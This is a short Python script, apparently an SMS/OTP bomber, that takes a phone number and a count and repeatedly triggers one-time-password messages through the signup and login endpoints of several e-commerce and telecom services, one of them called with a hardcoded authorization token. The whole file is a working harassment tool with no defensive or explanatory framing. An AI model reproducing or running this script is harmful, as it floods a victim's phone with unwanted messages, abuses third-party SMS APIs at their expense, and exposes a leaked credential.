import requests
from requests.structures import CaseInsensitiveDict
number=input("Enter Number: ")
amo=int(input("Enter Amo: "))

url = "https://www.pickaboo.com/rest/all/V1/sendotp?resend=0&storeId=1&mobile="+number+"&eventType=customer_signup_otp"


url1="http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number


url4 = "https://prodapi.swap.com.bd/api/v1/send-otp/login?mobile_number=88"+number+"&referral=false"

headers4 = {"x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3","Content-Type":"application/json"}



for i in range(amo):
    x=requests.post(url4,headers=headers4)
    print("sent")
    resp = requests.post(url)
    print(resp.text)
    resp=requests.get(url1)
    print(resp.text)
    print("\n",i+1,"\n")
